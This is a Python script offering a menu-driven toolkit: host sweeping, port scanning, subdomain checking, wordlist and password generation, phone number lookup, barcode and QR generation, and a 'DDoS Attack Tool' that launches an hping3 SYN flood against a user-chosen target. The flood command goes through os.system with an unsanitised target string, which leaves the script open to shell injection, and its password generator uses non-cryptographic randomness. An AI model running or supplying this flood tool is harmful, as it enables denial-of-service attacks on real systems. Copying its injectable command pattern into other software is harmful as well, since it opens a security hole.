import socket
import random
import string
import qrcode
import phonenumbers
import requests
import ipaddress
from scapy.all import sr1, IP, ICMP
from whois import whois
import itertools
import subprocess
import os

def is_host_live(host):
    packet = IP(dst=host)/ICMP()
    response = sr1(packet, timeout=2, verbose=False)
    return response is not None

def scan_ports(host, ports):
    open_ports = []
    closed_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            open_ports.append(port)
        else:
            closed_ports.append(port)
        sock.close()
    return open_ports, closed_ports

def generate_barcode(data, filename="barcode.png"):
    from barcode import Code128
    from barcode.writer import ImageWriter
    barcode = Code128(data, writer=ImageWriter())
    barcode.save(filename)
    print(f"Barcode saved as {filename}")

def generate_qrcode(data, filename="qrcode.png"):
    img = qrcode.make(data)
    img.save(filename)
    print(f"QR Code saved as {filename}")

def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(length))
    return password

def generate_wordlist(words, filename="wordlist.txt"):
    with open(filename, 'w') as f:
        for word in itertools.permutations(words):
            f.write(''.join(word) + '\n')
    print(f"Wordlist saved as {filename}")

def phone_number_info(number):
    phone_number = phonenumbers.parse(number)
    return {
        "Country": phonenumbers.region_code_for_number(phone_number),
        "Valid": phonenumbers.is_valid_number(phone_number),
        "Possible": phonenumbers.is_possible_number(phone_number),
    }

def check_subdomain(domain, subdomains):
    found_subdomains = []
    for subdomain in subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                found_subdomains.append(url)
        except requests.ConnectionError:
            continue
    return found_subdomains

def ddos_attack(target, port=80, duration=10):
    cmd = f"hping3 -S {target} -p {port} --flood -c {duration}"
    os.system(cmd)

def main():
    while True:
        print("""
        Select a tool:
        1. IP Scanner
        2. Port Scanner
        3. Barcode Generator
        4. QRCode Generator
        5. Password Generator
        6. Wordlist Generator
        7. Phone Number Information Gathering
        8. Subdomain Checker
        9. DDoS Attack Tool
        0. Exit
        """)
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            start_ip = input("Enter the starting IP address: ")
            end_ip = input("Enter the ending IP address: ")
            try:
                start_ip = ipaddress.ip_address(start_ip)
                end_ip = ipaddress.ip_address(end_ip)
            except ValueError as e:
                print(f"Invalid IP address: {e}")
                continue

            for ip in ipaddress.summarize_address_range(start_ip, end_ip):
                for host in ip:
                    if is_host_live(str(host)):
                        print(f"{host} is live.")
                    else:
                        print(f"{host} is not live.")
        
        elif choice == "2":
            target = input("Enter the target IP address for port scanning: ")
            ports = input("Enter the ports to scan (comma-separated): ")
            ports = [int(port.strip()) for port in ports.split(',')]
            open_ports, closed_ports = scan_ports(target, ports)
            print(f"Open ports: {open_ports}")
            print(f"Closed ports: {closed_ports}")
        
        elif choice == "3":
            data = input("Enter the data for barcode generation: ")
            generate_barcode(data)
        
        elif choice == "4":
            data = input("Enter the data for QR code generation: ")
            generate_qrcode(data)
        
        elif choice == "5":
            length = int(input("Enter the password length: "))
            password = generate_password(length)
            print(f"Generated password: {password}")
        
        elif choice == "6":
            words = input("Enter words for wordlist generation (comma-separated): ").split(',')
            generate_wordlist(words)
        
        elif choice == "7":
            number = input("Enter the phone number: ")
            info = phone_number_info(number)
            print(f"Phone Number Information: {info}")
        
        elif choice == "8":
            domain = input("Enter the domain: ")
            subdomains = input("Enter subdomains to check (comma-separated): ").split(',')
            found_subdomains = check_subdomain(domain, subdomains)
            print(f"Found subdomains: {found_subdomains}")
        
        elif choice == "9":
            target = input("Enter the target for DDoS attack: ")
            port = int(input("Enter the port for DDoS attack: "))
            duration = int(input("Enter the duration of the attack in seconds: "))
            ddos_attack(target, port, duration)
        
        elif choice == "0":
            break
        
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()